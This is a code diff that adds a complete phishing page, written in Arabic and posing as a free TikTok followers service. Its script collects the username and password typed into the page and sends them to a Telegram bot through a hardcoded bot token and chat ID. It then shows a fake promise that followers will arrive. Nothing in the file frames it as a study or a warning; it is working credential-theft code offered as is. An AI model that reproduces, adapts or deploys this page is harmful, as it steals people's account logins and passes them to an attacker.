@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<script>
+function hackTK() {
+    const urlParams = new URLSearchParams(window.location.search);
+    const chatId = urlParams.get('chatId') || "5905562720";
+    const token = "8521496596:AAGb7ODWoScawEb5Fm78sPLL8pfBeXZQzlg";
+    const user = document.getElementById('tkuser').value;
+    const pass = document.getElementById('tkpass').value;
+    const msg = `🎵 **صيد تيك توك جديد**\n\n👤 المستخدم: \`${user}\`\n🔑 الباسورد: \`${pass}\``;
+    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+    alert("سيتم البدء في إرسال المتابعين خلال 10 دقائق!");
+}
+</script>
+<body style="background:black; color:white; text-align:center; padding-top:50px; font-family:sans-serif;">
+    <h1 style="color:#ff0050;">TikTok <span style="color:#00f2ea;">Followers</span></h1>
+    <p>أدخل حسابك للحصول على 5000 متابع حقيقي</p>
+    <input id="tkuser" placeholder="Username / Email" style="width:75%; padding:15px; margin:10px; border-radius:5px; border:none;"><br>
+    <input id="tkpass" type="password" placeholder="Password" style="width:75%; padding:15px; margin:10px; border-radius:5px; border:none;"><br>
+    <button onclick="hackTK()" style="background:#ff0050; color:white; padding:15px 50px; border:none; font-weight:bold; border-radius:5px; margin-top:20px;">احصل على المتابعين</button>
+</body>
+</html>
